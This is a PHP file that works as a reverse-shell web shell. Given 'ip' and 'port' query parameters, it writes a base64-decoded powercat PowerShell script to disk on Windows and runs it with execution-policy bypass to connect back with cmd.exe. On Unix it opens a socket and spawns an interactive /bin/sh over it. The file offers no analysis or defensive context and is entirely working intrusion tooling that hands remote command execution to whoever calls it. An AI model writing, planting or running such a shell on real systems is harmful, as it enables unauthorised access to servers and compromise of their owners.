<?php 
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$powercatb64encoded = '';

$wdir = getcwd();
echo $wdir ."<br>";
if(isset($_GET["ip"]) && isset($_GET["port"])) {
    $ip = $_GET["ip"];
    $port = $_GET["port"];
    echo 'v1.1' ."<br>";
    echo $ip ."<br>";
    echo $port ."<br>";

    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Save the decoded script to a file
        $decodedScript = base64_decode($powercatb64encoded);
        $scriptPath = $wdir . "\powercat.ps1";
        file_put_contents($scriptPath, $decodedScript);
        if (file_exists($scriptPath)) {
            echo "Payload copied" ."<br>";
            echo $scriptPath ."<br>";
        } else {
            echo "Payload copy failed" ."<br>";
            exit;
        }
        // Execute the PowerShell script
        $cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -c 'Import-Module $scriptPath; powercat -c $ip -p $port -e cmd.exe'";
        echo $cmd ."<br>";
        $output = shell_exec($cmd); 
        echo $output . '<br>';
    } else {
        // Unix/Linux-specific command
        $sock = fsockopen($ip, $port);
        if($sock) {
            $cmd = "/bin/sh -i <&3 >&3 2>&3";
            echo $cmd ."<br>";
            exec($cmd);
        } else {
            echo "Could not establish a connection." ."<br>";
        }
    }
} else {
    echo "IP or Port parameter is missing." ."<br>";
}
?>
